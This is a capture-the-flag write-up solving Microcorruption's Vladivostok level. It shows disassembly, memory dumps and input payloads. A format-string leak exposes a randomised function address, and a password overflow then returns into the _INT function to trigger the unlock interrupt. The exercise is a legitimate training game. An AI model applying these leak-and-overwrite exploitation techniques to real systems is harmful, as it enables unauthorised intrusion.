# For Vladivostok in Microcorruption


Sample output of the program:
```
Username (8 char max):
>>solomon
Password:
Wrong!
```
Honestly, this output does not tell me much. Unlike the previous Microcorruption programs, the maximum character limit of 8 for the username is strictly followed. That could be a clue, but let's dive deeper to find out more.


#### Preliminary observations of the program

1. The username is copied to address `0x2426`. It has a character limit of `8`. On the other hand, the password is stored in some randomly allocated memory. The address is unknown.

2. I noticed that the `pc` ends at different addresses. First, it was `0xd966`. Next, it was `0x7338`, and so on. The address keeps changing randomly, perhaps as the result of calling `<rand>` function. So, let's find out!

### Address Space Layout Randomisation

```
4438 <main>
4438:  b012 1c4a      call	#0x4a1c <rand>
443c:  0b4f           mov	r15, r11
443e:  3bf0 fe7f      and	#0x7ffe, r11
4442:  3b50 0060      add	#0x6000, r11
4446:  b012 1c4a      call	#0x4a1c <rand>
444a:  0a4f           mov	r15, r10
444c:  3012 0010      push	#0x1000
4450:  3012 0044      push	#0x4400 <__init_stack>
4454:  0b12           push	r11
4456:  b012 e849      call	#0x49e8 <_memcpy>
445a:  3150 0600      add	#0x6, sp
445e:  0f4a           mov	r10, r15
4460:  3ff0 fe0f      and	#0xffe, r15
4464:  0e4b           mov	r11, r14
4466:  0e8f           sub	r15, r14
4468:  3e50 00ff      add	#0xff00, r14
446c:  0d4b           mov	r11, r13
446e:  3d50 5c03      add	#0x35c, r13
4472:  014e           mov	r14, sp
4474:  0f4b           mov	r11, r15
4476:  8d12           call	r13
```

The disassembly of the `<main>` function is above. Pay attention to these particular function calls: `4438:  call	#0x4a1c <rand>` ,
`4446:    call	#0x4a1c <rand>` , and `4456:   call	#0x49e8 <_memcpy>`.


`4438:   call	#0x4a1c <rand>` (whose result is moved to `r11`) is the destination address of `<_memcpy>`. I know this because `push	r11` means `r11` is an argument to the `<_memcpy>` function call.

`4446:  call	#0x4a1c <rand>` does not seem to affect `<_memcpy>` in any way, so at first I thought it was irrelevant. (I was so wrong to think that) but for now, let's talk about `<_memcpy>`.


`_memcpy(r11, 0x4400, 0x1000)` copies `0x1000` bytes of memory starting from address `0x4400` to a random address generated by `4438:  b012 1c4a      call	#0x4a1c <rand>`. From the disassembly, we know that instructions are stored in address `0x4400` as `<__init_stack>` is a legit executable function. Then came the sudden realisation that this is how the address of the instructions of the program are randomised. That sounds *alot* like ASLR. That explains now why our `pc` ends at different addersses (as observed in point 2).

Let's talk about `4446:  b012 1c4a      call	#0x4a1c <rand>` now. At first, to me, it seemed useless. It played no role in the determination of the destination address. 
```
4446:  b012 1c4a      call	#0x4a1c <rand>
444a:  0a4f           mov	r15, r10

***other instructions***

445e:  0f4a           mov	r10, r15
4460:  3ff0 fe0f      and	#0xffe, r15
4464:  0e4b           mov	r11, r14
4466:  0e8f           sub	r15, r14
4468:  3e50 00ff      add	#0xff00, r14
446c:  0d4b           mov	r11, r13
446e:  3d50 5c03      add	#0x35c, r13
4472:  014e           mov	r14, sp
```
Take a look at the snippet of the code above. That `<rand>` function's value was saved in `r10`, then combined with `r11`. Recall that `r11` stores the result from the first `<rand>` function, and that result is moved to the `sp`. That means that the `sp` is changed according to some calculation involving the 2 `<rand>` functions.


### Demonstrating ASLR

>ASLR provides protection by randomizing positions of key program components in virtual memory. The randomization targets code and data segments, stack, heap and libraries. The purpose of ASLR is to make it difficult, if not impossible, for the attacker to know the location of specific code pages in the program’s address space.
*Source\: [Jump Over ASLR:Attacking Branch Predictors to Bypass ASLR](http://www.cs.ucr.edu/~nael/pubs/micro16.pdf)*

At the time of doing this experiment, `4438:  b012 1c4a      call	#0x4a1c <rand>` determined that the `0x1000` instruction bytes from `0x4400` were to be moved to address `0x922a`. You will see a memory dump before and after the execution of `4456:  b012 e849      call	#0x49e8 <_memcpy>`.

##### Before  
  
```
4400:   3140 0044 1542 5c01 75f3 35d0 085a 3f40   1@.D.B\.u.5..Z?@
4410:   0000 0f93 0724 8245 5c01 2f83 9f4f 704a   .....$.E\./..OpJ

*** program instructions stored in memory ***

4a60:   b012 1000 3241 3152 0f43 2153 3041 0013   ....2A1R.C!S0A..
4a70:   *
ff80:   7e44 7e44 7e44 7e44 7e44 7e44 7e44 7e44   ~D~D~D~D~D~D~D~D
```

As we can see above, `0x922a` onwards are all null bytes. They are not shown here because Microcorruption does not show part of the memory that contains only nulls.

##### After
  
```
9220:   0000 0000 0000 0000 0000 3140 0044 1542   ..........1@.D.B
9230:   5c01 75f3 35d0 085a 3f40 0000 0f93 0724   \.u.5..Z?@.....$
9240:   8245 5c01 2f83 9f4f 704a 0024 f923 3f40   .E\./..OpJ.$.#?@
9250:   3200 0f93 0624 8245 5c01 1f83 cf43 0024   2....$.E\....C.$

*** program instructions stored in memory ***

9870:   3d40 7e00 0c41 0c12 0e12 0d12 0012 0212   =@~..A..........
9880:   0f4d 8f10 024f 32d0 0080 b012 1000 3241   .M...O2.......2A
9890:   3152 0f43 2153 3041 0013 0000 0000 0000   1R.C!S0A........
```

This is how the instructions of the program are stored in addresses different everytime you run it.

Do not forget that the stack's address range is *also* changed! That means no more simple stack overflow attacks that involve returning to our shellcode.


### Further observations of the program

3. Regardless of the output of the 2 `<rand>` functions, `call r13` always calls `<aslr_main>`. Recall that `r11` is the destination address where the program instructions are copied to. `r13` is always offset from `r11` by `0x35c`, the same way the function `475c <aslr_main>` is always offset from `0x4400` by `0x35c`.
```
475c <aslr_main>
475c:  0e4f           mov	r15, r14
475e:  3e50 8200      add	#0x82, r14
4762:  8e12           call	r14
4764:  32d0 f000      bis	#0xf0, sr
4768:  3041           ret
```
Before `<aslr_main>` was called by `<main>`, the caller executed `mov   r11, r15`. That means `r15` is equal to the output of `4438:  call  #0x4a1c <rand>`, the function that determined where the instruction bytes would end up.
The callee now calls `0x4482 <_aslr_main>`. 

4. After `<main>` calls `<aslr_main>`, because the address of the instructions are changed, we cannot use break points anymore to stop the program execution. Without the blessing of breakpoints, I decided to eyeball the disassembly of the function to see what I was dealing with. Below are some portions that give a rough idea on how the function works.

Firstly, this segment of the function deletes the instructions originally stored in 0x4400 and copied to a randomly generated destination address.
```
4494:  ce43 0044      mov.b	#0x0, 0x4400(r14)
4498:  1e53           inc	r14
449a:  3e90 0010      cmp	#0x1000, r14
449e:  fa23           jne	#0x4494 <_aslr_main+0x12>
```
```
4400:   0000 0000 0000 0000 0000 0000 0000 0000   ................
4410:   0000 0000 0000 0000 0000 0000 0000 0000   ................
4420:   0000 0000 0000 0000 0000 0000 0000 0000   ................
*** more null bytes inbetween ***
53e0:   0000 0000 0000 0000 0000 0000 0000 0000   ................
53f0:   0000 0000 0000 0000 0000 0000 0000 0000   ................
5400:   *
```
Secondly, the segment below copies the string `"Username (8 char max):"` to memory.
```
44a0:  f240 5500 0224 mov.b	#0x55, &0x2402
44a6:  f240 7300 0324 mov.b	#0x73, &0x2403
44ac:  f240 6500 0424 mov.b	#0x65, &0x2404
*** more similar looking instructions here ***
451e:  f240 3a00 1724 mov.b	#0x3a, &0x2417
4524:  c243 1824      mov.b	#0x0, &0x2418
```
Thirdly, this segment below copies the string "Password:" to memory. This occurs *after* the username has been entered.
```
45f8:  f240 0a00 0224 mov.b	#0xa, &0x2402
45fe:  f240 5000 0324 mov.b	#0x50, &0x2403
*** more similar looking instructions here ***
462e:  f240 3a00 0b24 mov.b	#0x3a, &0x240b
4634:  c243 0c24      mov.b	#0x0, &0x240c
```
 This means somewhere between `0x4524` and `0x45f8`, there lie the function calls to read input (ie the username) and to print it out . Weirdly though, there is no explicit calls to `gets` or `puts` unlike previous challenges. These are the incomprehensible instructions that lie between and are doing said magic.
 ```
 4582:  0e12           push	r14
4584:  0d12           push	r13
4586:  0e12           push	r14
4588:  0012           push	pc
458a:  0212           push	sr
458c:  0f4e           mov	r14, r15
458e:  8f10           swpb	r15
4590:  024f           mov	r15, sr
4592:  32d0 0080      bis	#0x8000, sr
4596:  b012 1000      call	#0x10
```
The only thing I've been able to identify so far is that `call #0x10` calls a `<__trap_interrupt>` function, which as the name suggests, is a [trap](https://en.wikipedia.org/wiki/Trap_(computing)). My guess is, this is *probably* where the program switches to kernel mode and calls those `gets`, `puts`, and `printf` functions without explicitly calling them. Whether true or not, the fact is that those functions *are* being called, but the disassembly is made so obscure, I cannot possibly tell at first glance. 

5. The program prompted me for a username and password. The username is capped at 8 bytes (so my input of `"aaaaaaaaaaa"` was truncated), so naturally I assumed that it was the case for the password too. Nonetheless I decided to try my luck. I gave `"aaaaaaaabbbbbbbb"` as my input. Guess what? The program actually accepted it! 
```
c890:   6161 6161 6161 6161 6161 6262 6262 6262   aaaaaaaaaabbbbbb
c8a0:   6262 6262
```
Soon slightly after, the register values showed `sp  c898`, and `ret` was executed. Part of my input was popped into the `pc`, and I got the error`insn address unaligned`. The register values showed `pc  6161`, meaning the program tried to return to address `0x6161`. 

6. I noticed `printf` was included in the program, but *did not seem to be called anywhere*. Weird. Why would an unnecessary function be included? Something is definitely printed using `printf`. Well, I thought, "Echoing a user input is about as unecessary as implementing an uncalled function. So perhaps, maybe my username is actually printed by `printf`". That said, there is only one way to test this theory. I put `"%d%dhihi"` as my input.
```
Username (8 char max):
>>0000b7c0hihi
```
Oh look! `%d` indeed formatted the string to print values from the stack! So that means it really is `printf`! That means we can execute **format string attack** with our username!

### Vulnerabilities without a purpose

Point 5 above noted that the program would return to an address stated in the input. That means we can redirect the code to whereever we want in the program. There lies the complication. Because ASLR is enabled, how on earth would I possibly know the address of the program code I want to return to??

Point 6 presented to me a format string attack. It can print out values of the stack (like the challenge 'start' in pwnable.tw), or can write into memory using `%n`. The problem is, I have no idea if the values at the top of the stack have any meaning, that printing them out `%x` or writing to the address they point to using `%n`. For example, if the top of the stack always contains the address of the flag used by `4a42 <conditional_unlock_door>` to verify the password, then `%n` can override the flag's value.

┻━┻ ︵ヽ(`Д´)ﾉ︵ ┻━┻  

### Determined to persist

According to online sources, one way to bypass ASLR is through *"information leak"* by format string attack. Considering that this challenge must be solved somehow, surely the information we print must serve a purpose. Giving an input of `%d%d%d%d` yielded me the output below in the format of `0000 <weird hex values> 0000 0000`. One such instance is below:
```
Username (8 char max):
>>0000ccd400000000
Password:
```
I decided to check what `0xccd4` was. Was it an address? A register value? Turns out it was the address of the `<printf>` function after the round of address randomisation. I restarted the program a few times to test the output, but the address of `<printf>` is always printed.

Ok, so what good does that do? Well, if you have not noticed, while ASLR randomises the address of the instruction bytes, it does so as *a whole set*. It means that the offset of a function's address to another function's address remains the same even with ASLR. For example, say I have a function `<foo>` at address `0x0000`, and another function `<foo2>` at address `0x0100`. Using ASLR, I can change the address of `<foo>` to address '0xYYYY' (where Y is any random hex value), and the address of `<foo2>` is always `0xYYYY + 0x0100`.

That meant that I could calculate the offset of all other functions in this program to `<printf>` and I would get their post-ASLR addresses. Using point 5 above with this means I can return to any function I choose. So, which function shall I choose? My goal is to unlock the door (preferably without the password), so that means calling `INT 0x7f`. 

### First attempt
Initially, I thought I could use part of `<conditional_unlock_door>`. 
```
4a42 <conditional_unlock_door>
4a42:  2183           decd	sp
4a44:  0e4f           mov	r15, r14
4a46:  3d40 7e00      mov	#0x7e, r13
4a4a:  0c41           mov	sp, r12
4a4c:  0c12           push	r12
4a4e:  0e12           push	r14
4a50:  0d12           push	r13
--- I will use this portion below ---
4a52:  0012           push	pc
4a54:  0212           push	sr
4a56:  0f4d           mov	r13, r15
4a58:  8f10           swpb	r15
4a5a:  024f           mov	r15, sr
4a5c:  32d0 0080      bis	#0x8000, sr
4a60:  b012 1000      call	#0x10
```
My password input would be `0x6161616161617f00 <0x4a52 + ASLR_offset>`. That way I insert `0x7f` into the stack and continue the execution, hopefully calling `INT 0x7f`. I cannot execute the whole function because `mov	#0x7e, r13 ... push	r13` will end up calling `INT #0x7e` instead.

Sadly, running the program got the error `insn address unaligned` Apparently somewhere went wrong. It could be an error in my code, or it could be undefined program behaviour because afterall, I did not execute the whole program, but just part of it. Either way, it was too troublesome to troubleshoot, and I saw an easier alternative.

### Correct solution
I noticed that there was a function casually lying in the program 
```
48ec <_INT>
48ec:  1e41 0200      mov	0x2(sp), r14
48f0:  0212           push	sr
48f2:  0f4e           mov	r14, r15
48f4:  8f10           swpb	r15
48f6:  024f           mov	r15, sr
48f8:  32d0 0080      bis	#0x8000, sr
48fc:  b012 1000      call	#0x10
4900:  3241           pop	sr
4902:  3041           ret
```
It basically takes a value from the stack, and executes it as an `INT <value in the stack>`. Now, that sounds interesting! Afterall, our password input is stored in the stack. This gives us the chance to call `INT 0x7f`. Let's try it out!

Username: `%x%x%x%x` gives us:
```
Username (8 char max):
>>0000ccd400000000
Password:
```
Then our password input is `"0x6161616161616161debc61617f00"`. `0xdebc` is the return address to the post-ASLR `<_INT>` function. `0x7f00` is read by `mov	0x2(sp), r14`, causing this function to call `INT 0x7f`. The `0x61` characters are just padding.

And so, our door is unlocked! ヽ(´▽`) / 


END